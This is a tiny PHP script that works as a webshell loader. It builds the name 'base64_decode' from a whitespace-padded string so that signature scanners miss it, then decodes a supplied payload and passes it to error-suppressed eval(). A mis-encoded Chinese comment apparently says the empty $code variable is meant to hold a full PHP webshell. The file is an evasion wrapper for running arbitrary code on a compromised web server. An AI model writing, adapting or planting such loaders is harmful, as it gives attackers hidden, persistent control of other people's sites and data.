<?php
header("Content-type: text/html; charset=utf-8");
function test($code){
$password='xxx';
$a=preg_filter('/\s+/','','base 64 _ deco de');
$c=$a($code);
@eval($c);
}
$code='';	//code´æ·Åphp´óÂí
test($code);
?>